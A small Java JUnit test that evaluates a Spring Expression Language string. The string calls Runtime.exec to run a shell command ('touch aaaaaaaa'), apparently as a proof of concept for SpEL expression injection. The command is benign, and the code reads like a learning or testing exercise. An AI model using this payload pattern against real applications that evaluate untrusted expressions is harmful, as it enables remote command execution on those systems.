package request;

import org.junit.Test;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

/**
 * Created by aaa on 18-4-25.
 */
public class SpringExpressionLanguage {
    @Test
    public void test(){
        ExpressionParser parser=new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec('touch aaaaaaaa')";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}
